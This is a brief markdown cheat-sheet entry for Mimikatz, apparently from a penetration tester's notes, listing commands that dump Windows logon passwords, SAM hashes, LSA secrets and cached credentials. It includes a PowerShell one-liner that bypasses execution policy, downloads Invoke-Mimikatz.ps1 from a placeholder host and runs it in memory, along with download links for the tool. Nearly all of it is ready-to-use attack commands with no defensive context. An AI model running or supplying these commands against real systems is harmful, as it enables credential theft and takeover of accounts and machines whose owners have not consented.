# Name
Mimikatz

## Usage
```
token::elevate
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache

powershell -ep bypass -nop -c "iex (iwr http://IP/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'"
```

## Source
* [Mimikatz v2.1.1](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip)
* [Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1)
* [Mimikatz.exe](https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip)
